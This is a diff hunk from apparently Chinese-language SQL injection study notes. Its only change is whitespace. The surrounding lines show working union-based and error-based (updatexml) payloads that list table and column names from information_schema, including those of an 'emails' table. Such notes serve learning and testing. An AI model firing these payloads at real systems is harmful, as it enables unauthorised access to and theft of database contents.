@@ -103,7 +103,7 @@ id=1' union select 1,2,group_concat(table_name,'_',column_name) from information
 3#查询数据库的表名，limit后第一个数字表示第几个表</br>
 ```
 ?id=1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)%23  
-```                  
+```              
 4#查询列名，limit后数字表示第几列</br>
 ```
 ?id=1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name='emails' limit 0,1),0x7e),1)%23
